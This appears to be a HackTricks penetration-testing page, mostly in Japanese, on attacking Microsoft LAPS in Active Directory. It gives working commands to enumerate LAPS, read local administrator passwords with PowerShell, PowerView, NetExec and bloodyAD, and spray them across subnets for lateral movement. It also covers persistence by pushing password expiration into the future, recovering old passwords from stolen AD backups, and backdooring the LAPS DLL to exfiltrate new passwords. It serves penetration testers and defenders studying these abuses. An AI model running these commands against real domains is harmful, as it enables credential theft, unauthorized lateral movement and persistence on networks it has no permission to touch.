# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Basic Information

現在、アセスメント中に遭遇しうる **2つの LAPS フレーバー** があります:

- **Legacy Microsoft LAPS**: ローカル管理者パスワードを **`ms-Mcs-AdmPwd`** に、期限切れ時刻を **`ms-Mcs-AdmPwdExpirationTime`** に保存します。
- **Windows LAPS** (Windows には April 2023 updates 以降組み込み): legacy mode をエミュレートすることもできますが、native mode では **`msLAPS-*`** 属性を使用し、**password encryption**、**password history**、および domain controllers 向けの **DSRM password backup** をサポートします。

LAPS は **local administrator passwords** を管理するよう設計されており、domain-joined computers 上でそれらを **unique, randomized, and frequently changed** にします。これらの属性を読めるなら、通常は affected host に対して **local admin として pivot** できます。多くの環境では、重要なのはパスワード自体を読むことだけではなく、**誰が** password attributes へのアクセス権を委任されているかを見つけることです。

### Legacy Microsoft LAPS attributes

domain の computer objects では、legacy Microsoft LAPS の実装により 2つの属性が追加されます:

- **`ms-Mcs-AdmPwd`**: **plain-text administrator password**
- **`ms-Mcs-AdmPwdExpirationTime`**: **password expiration time**

### Windows LAPS attributes

Native Windows LAPS は computer objects にいくつかの新しい属性を追加します:

- **`msLAPS-Password`**: encryption が有効でない場合、JSON として保存される clear-text password blob
- **`msLAPS-PasswordExpirationTime`**: scheduled expiration time
- **`msLAPS-EncryptedPassword`**: encrypted current password
- **`msLAPS-EncryptedPasswordHistory`**: encrypted password history
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: domain controllers 向けの encrypted DSRM password data
- **`msLAPS-CurrentPasswordVersion`**: 新しい rollback-detection logic で使われる GUID-based version tracking (Windows Server 2025 forest schema)

**`msLAPS-Password`** が読める場合、その値は account name、update time、そして clear-text password を含む JSON object です。たとえば:
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### 有効化されているか確認する
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## LAPS Password Access

`\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` から **raw LAPS policy** をダウンロードし、[**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) パッケージの **`Parse-PolFile`** を使って、このファイルを人間が読める形式に変換できます。

### Legacy Microsoft LAPS PowerShell cmdlets

legacy LAPS module がインストールされている場合、通常は以下の cmdlets が利用できます:
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### Windows LAPS PowerShell cmdlets

Native Windows LAPS には、新しい PowerShell module と新しい cmdlets が付属しています:
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText

# Use alternate credentials for an authorized decryptor
$cred = Get-Credential CONTOSO\LAPSDecryptor
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -DecryptionCredential $cred
```
A few operational details matter here:

- **`Get-LapsADPassword`** は **legacy LAPS**、**clear-text Windows LAPS**、**encrypted Windows LAPS** を自動的に処理します。
- パスワードが encrypted で、**read** はできても **decrypt** できない場合、cmdlet は clear-text パスワードを返せなくても **`Source`**、**`DecryptionStatus`**、**`AuthorizedDecryptor`** などのメタデータを返します。
- **encrypted Windows LAPS** では、**read permission** と **decrypt permission** は **別の制御** です。OU / object の read access があるからといって、**`msLAPS-EncryptedPassword`** を自動的に decrypt できるわけではありません。
- **Password history** は **Windows LAPS encryption** が有効な場合にのみ利用できます。
- domain controllers では、返される source が **`EncryptedDSRMPassword`** になることがあります。

これは assessment 中に有用です。なぜなら **`AuthorizedDecryptor`** フィールドが、その blob が **どの user または group 向けに encrypted されたか** を示し、失敗した password read を新しい privilege-escalation target に変えられることが多いからです。

### PowerView / LDAP

**PowerView** は、**誰が password を read できて、それを read するか** を調べるためにも使えます：
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
もし **`msLAPS-Password`** が読み取り可能なら、返された JSON を解析し、パスワードには **`p`**、管理対象のローカル admin アカウント名には **`n`** を抽出する。
```bash
# Extract both the password and the real managed account name
$laps = (Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password)."msLAPS-Password" | ConvertFrom-Json
$laps.n
$laps.p
```
That **`n`** フィールドは新しい展開では重要です。というのも、**Windows LAPS automatic account management** は組み込みの **`Administrator`** ではなく **カスタムアカウント** を対象にでき、さらに新しい **Windows 11 24H2 / Windows Server 2025** システムでは、そのアカウント名を **randomize** することさえできます。

### Linux / remote tooling

現代の tooling は、従来の Microsoft LAPS と Windows LAPS の両方をサポートしています。
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
メモ:

- 最近の **NetExec** ビルドは **`ms-Mcs-AdmPwd`**、**`msLAPS-Password`**、および **`msLAPS-EncryptedPassword`** をサポートしています。
- **`pyLAPS`** は Linux からの **legacy Microsoft LAPS** にはまだ有用ですが、対象は **`ms-Mcs-AdmPwd`** のみです。
- **`LAPS4LINUX`**、**`dpapi-ng`** ベースのツール、最近の **NetExec** ワークフローのような新しいクロスプラットフォームツールでも、非 Windows ホストから **native Windows LAPS** を扱えます。
- 環境が **encrypted Windows LAPS** を使っている場合、単純な LDAP 読み取りだけでは不十分です。**authorized decryptor**（または、オフラインのドメイン DPAPI-NG root key material のような同等の復号材料）である必要があります。
- **Windows 11 24H2 / Windows Server 2025** では、管理対象のローカル管理者が常に **`Administrator`** だと決めつけないでください。Automatic account management によりカスタムアカウントが作成され、必要に応じて名前もランダム化されます。そのため、大規模に **`--laps`** を使う前に、まず **`n`** / **`Account`** でアカウント名を確認してください。

### Directory synchronization abuse

ドメインレベルの **directory synchronization** 権限が各コンピュータオブジェクトへの直接読み取りアクセスの代わりにある場合でも、LAPS は依然として有用です。

**`DS-Replication-Get-Changes`** と **`DS-Replication-Get-Changes-In-Filtered-Set`** または **`DS-Replication-Get-Changes-All`** の組み合わせは、従来の **`ms-Mcs-AdmPwd`** のような **confidential / RODC-filtered** 属性を同期するために使えます。BloodHound はこれを **`SyncLAPSPassword`** としてモデル化します。レプリケーション権限の背景については [DCSync](dcsync.md) を確認してください。

## LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) は、いくつかの関数によって LAPS の列挙を容易にします。\
その1つは、**LAPS が有効なすべてのコンピュータ**に対する **`ExtendedRights`** の解析です。これにより、**LAPS パスワードを読み取るために明示的に委任されたグループ**が表示されます。これらは多くの場合、保護されたグループ内のユーザーです。\
ドメインに **computer** を参加させた **account** は、そのホストに対して `All Extended Rights` を得ます。この権限により、その **account** は **passwords** を読み取れるようになります。列挙によって、ホスト上の LAPS パスワードを読み取れるユーザーアカウントが見つかることがあります。これは、LAPS パスワードを読める特定の AD ユーザーを **target** するのに役立ちます。
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## NetExec / CrackMapExec を使った LAPS パスワードのダンプ

対話的な PowerShell がない場合でも、LDAP 経由でこの権限をリモートから悪用できます:
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
これは、ユーザーが読み取れるすべての LAPS secrets をダンプし、別のローカル管理者パスワードを使って lateral movement できるようにします。

## Using LAPS Password
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## LAPS Persistence

### 有効期限

一度 admin になると、**passwords を取得**し、**有効期限を将来に設定**することで、machine がその**password**を**更新**するのを**prevent**できます。

Legacy Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
Native Windows LAPS は代わりに **`msLAPS-PasswordExpirationTime`** を使用します:
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> パスワードは、**admin** が **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`** を使った場合、または **Do not allow password expiration time longer than required by policy** が有効な場合でも、引き続きローテートされます。

### 新しい Windows LAPS における snapshot rollback の注意点

古い snapshot / image rollback の手法は、最近の **Windows LAPS** デプロイでは**信頼性が低い**です。**Windows 11 24H2 / Windows Server 2025** では、forest schema に **`msLAPS-CurrentPasswordVersion`** (**Windows Server 2025 forest schema**) が含まれている場合、client はローカルにキャッシュされた GUID を AD に保存されている値と比較し、rollback により **torn state** が発生すると**即座にパスワードをローテート**します。

実際には、これは snapshot ベースの persistence や、既知の古い local admin password を復活させる試みが、次回の通常の expiration まで持ちこたえるのではなく、すぐに失敗する可能性が高いことを意味します。

この protection は **AD-backed Windows LAPS** にのみ適用され、さらに復元した machine が **AD に再認証できる**ことが前提です。machine がもう AD と通信できない場合でも、**password history** や **AD backup access** がまだ役に立つことがあります。

### Automatic account management の改ざんに関する注意点

**automatic account management** が有効な場合、Windows LAPS が managed local admin account の lifecycle を管理します。その account を rename、reconfigure、またはその他の方法で改ざんしようとする予期しない試みは、**`STATUS_POLICY_CONTROLLED_ACCOUNT`** / **`ERROR_POLICY_CONTROLLED_ACCOUNT`** で拒否されることがあり、managed LAPS account を密かに変更することに依存する persistence は、新しい endpoint では信頼性が低くなります。

### AD backups から過去の password を復元する

**Windows LAPS encryption + password history** が有効な場合、マウントされた AD backups は秘密情報の追加ソースになりえます。マウントされた AD snapshot にアクセスでき、**recovery mode** を使えるなら、live DC に接続せずに、保存されている古い password を問い合わせることができます。
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
これは主に **AD backup theft**、**offline forensics abuse**、または **disaster-recovery media access** の際に関連します。

### Backdoor

legacy Microsoft LAPS の元のソースコードは [here](https://github.com/GreyCorbel/admpwd) で見つかるため、コード内に backdoor を仕込むことが可能です（たとえば `Main/AdmPwd.PS/Main.cs` の `Get-AdmPwdPassword` メソッド内など）。それにより、何らかの方法で **新しいパスワードを exfiltrate する**、または **どこかに保存する** ようにできます。

その後、新しい `AdmPwd.PS.dll` をコンパイルし、マシンの `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` にアップロードします（そして modification time を変更します）。

## References

- [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory)
- [https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes)
- [https://blog.xpnsec.com/lapsv2-internals/](https://blog.xpnsec.com/lapsv2-internals/)


{{#include ../../banners/hacktricks-training.md}}
